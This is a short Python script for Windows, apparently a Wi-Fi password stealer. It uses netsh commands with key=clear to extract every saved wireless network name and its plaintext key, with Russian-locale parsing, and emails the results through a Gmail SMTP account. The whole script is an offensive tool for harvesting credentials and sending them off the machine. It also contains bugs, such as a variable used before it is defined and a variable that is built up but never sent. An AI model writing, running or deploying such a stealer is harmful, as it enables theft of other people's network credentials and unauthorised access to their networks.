#!/usr/bin/python3
import subprocess
import smtplib

login = "enter your gmail email here"
password = "enter your gmail password here"

smtpObj = smtplib.SMTP('smtp.gmail.com', 587)
smtpObj.starttls()
smtpObj.login(login, password)

data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode("cp866").split('\n')
wifis = [line.split(':')[1][1:-1] for line in data if "Все профили пользователей" in line]

for wifi in wifis:
	results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', wifi, 'key=clear']).decode('cp866').split('\n')
	results = [line.split(':')[1][1:-1] for line in results if "Содержимое ключа" in line]
	try:
		message = (f'name: {wifi}, Password: {results[0]}')
		finalmessage = finalmessage + "----------------" + "\n" + message + "\n"
	except IndexError:
		message = (f'name: {wifi}, Password: {results[0]}')
		finalmessage = finalmessage + "----------------" + "\n" + message + "\n"

smtpObj.sendmail(login, login, message)
